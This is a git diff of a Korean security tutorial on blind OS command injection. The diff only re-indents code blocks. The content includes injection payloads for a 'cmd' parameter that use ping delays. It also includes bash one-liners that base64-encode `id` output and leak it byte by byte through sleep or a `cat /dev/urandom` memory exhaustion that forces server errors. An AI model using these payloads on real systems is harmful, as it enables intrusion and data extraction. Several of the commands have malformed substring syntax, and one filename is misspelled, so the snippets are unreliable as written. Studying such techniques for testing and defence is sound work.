@@ -101,32 +101,36 @@ exec('cat'+textfilename) 혹은 system('cat'+textfilename)
 
 <div class="notice--primary" markdown="1">
 
-    ```
+```
 [윈도우]
 ?cmd=[입력값]& ping -i 2 -n 10 127.0.0.1 &
 [리눅스/유닉스]
 ?cmd=[입력값]& ping -c 2 -i 10 127.0.0.1 &
 ?cmd=[입력값]& ping -c 2 -i 10 127.0.0.1; x || ping -n 10 127.0.0.1 &
-    ``` 
+``` 
 
 - 위와 같이 지연시간을 통해 해당 OS Injection 취약점이 존재하는지에 대한 판별이 가능하다
 - 혹은 500에러 (Internal Server Error)을 고의적으로 발생시켜 참과 거짓 여부를 판별할 수 있다.
 
 
 
-    ```
+```
 id | base64 -w 0
-    ```
+```
+
 - 위와 같이 공격자가 읟조한 명령어를 base64로 인코딩하여, 결과 값을 한 바이트씩 비교하여 참일 경우 SLEEP 명령어를 실행하도록 하는 방법이 존재한다.
 - 예를 들면 아래와 같다.
-    ```
+
+```
 bash -c "a=\$(id | base64 -w 0); if [ \$(a:0:1) == 'd' ]; then sleep 2; fi;"
-    ```
+```
+
 - 이와 같이 시간지연이 불가능하거나 확인이 어려울 경우 에러를 고의적으로 발생시켜 base64로 인코딩 된 값을 1바이트씩 비교할 수 있다. 이 때 메모리 소모를 위해 internal Server Error를 발생시켜야 하며, cat /dev/urandom 명령어를 실행시킨다면 다량의 메모리를 소모시킬 수 있게된다.
 
-    ```
+```
 bash -c "a=\$(id | base64 -w 0); if [ \&{a:0:1} == 'd' ]; then cat /dev/urandom; fi;"
-    ```
+```
+
 - 이와 같이 코드가 참일 경우 cat /dev/uarndom이 실행되며, 500 에러를 유발한다.
 
 </div>
